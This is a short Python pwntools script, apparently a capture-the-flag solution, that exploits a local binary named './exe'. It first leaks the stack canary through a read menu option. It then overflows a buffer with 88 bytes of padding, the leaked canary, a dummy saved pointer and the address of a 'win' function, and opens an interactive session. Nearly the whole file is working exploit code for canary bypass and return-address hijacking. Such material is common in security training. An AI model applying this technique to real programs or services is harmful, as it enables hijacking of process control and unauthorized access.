from pwn import *

file = "./exe"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
io = process(file)
#io = remote(HOST, PORT)

def write(size: bytes, contents: bytes):
    io.sendlineafter("command: ", "1")
    io.sendlineafter("write: ", size)
    io.sendlineafter("bytes): ", contents)

def leak_canary() -> bytes:
    io.sendlineafter("command: ", "0")
    io.sendlineafter("read: ", "11")
    return io.recvn(8)

canary = leak_canary()
write(b"120", b"A"*88+canary+p64(0)+p64(e.sym["win"]))

io.interactive()
